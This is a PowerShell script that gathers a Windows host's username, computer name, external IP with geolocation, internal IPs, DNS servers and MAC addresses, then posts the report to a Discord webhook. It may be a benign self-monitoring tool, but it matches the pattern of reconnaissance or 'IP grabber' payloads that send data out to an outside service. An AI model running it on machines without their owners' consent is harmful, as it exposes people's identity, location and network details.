param(
    [Parameter(Mandatory=$false)]
    [string]$WebhookUrl = "YOUR-WEBHOOK-URL-HERE"
)

function Get-ExternalIP {
    try {
        # Try multiple IP services in case one fails
        $services = @(
            "http://ifconfig.me/ip",
            "https://api.ipify.org",
            "http://icanhazip.com"
        )
        
        foreach ($service in $services) {
            try {
                $ip = Invoke-RestMethod -Uri $service -TimeoutSec 5
                if ($ip) { return $ip.Trim() }
            } catch {
                continue
            }
        }
        throw "Could not get external IP"
    } catch {
        Write-Warning "Failed to get external IP: $_"
        return "Unknown"
    }
}

function Get-IPDetails {
    param($webhook)
    
    try {
        $info = @()
        $info += "=== IP INFORMATION REPORT ==="
        $info += "Timestamp: $(Get-Date)"
        $info += "Computer Name: $env:COMPUTERNAME"
        $info += "Username: $env:USERNAME"
        $info += "===================="
        
        # Get external IP
        $externalIP = Get-ExternalIP
        $info += "`nEXTERNAL IP: $externalIP"
        
        # Get geolocation data
        try {
            $geoData = Invoke-RestMethod -Uri "http://ip-api.com/json/$externalIP" -TimeoutSec 5
            $info += "`nLOCATION INFO:"
            $info += "Country: $($geoData.country)"
            $info += "Region: $($geoData.regionName)"
            $info += "City: $($geoData.city)"
            $info += "ISP: $($geoData.isp)"
            $info += "Timezone: $($geoData.timezone)"
        } catch {
            $info += "`nCould not get location data"
        }
        
        # Get internal IPs
        $info += "`nINTERNAL IPs:"
        Get-NetIPAddress | Where-Object {
            $_.AddressFamily -eq "IPv4" -and 
            $_.IPAddress -notmatch "^(127\.|169\.254\.)"
        } | ForEach-Object {
            $info += "Interface: $($_.InterfaceAlias)"
            $info += "IP: $($_.IPAddress)"
        }
        
        # Get DNS servers
        $info += "`nDNS SERVERS:"
        Get-DnsClientServerAddress | Where-Object {
            $_.AddressFamily -eq 2 -and 
            $_.ServerAddresses
        } | ForEach-Object {
            $info += "Interface: $($_.InterfaceAlias)"
            $info += "Servers: $($_.ServerAddresses -join ', ')"
        }
        
        # Get active network adapters
        $info += "`nACTIVE ADAPTERS:"
        Get-NetAdapter | Where-Object Status -eq "Up" | ForEach-Object {
            $info += "Name: $($_.Name)"
            $info += "MAC: $($_.MacAddress)"
            $info += "Speed: $([math]::Round($_.LinkSpeed/1000000, 2)) Mbps"
        }
        
        # Send to Discord
        $payload = @{
            content = "```$($info -join "`n")```"
            username = "IP Info Bot"
        } | ConvertTo-Json
        
        Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json"
        
        Write-Output "IP information sent to Discord"
        
    } catch {
        Write-Warning "Operation failed: $_"
    }
}

# Execute the IP info gathering
Get-IPDetails -webhook $WebhookUrl
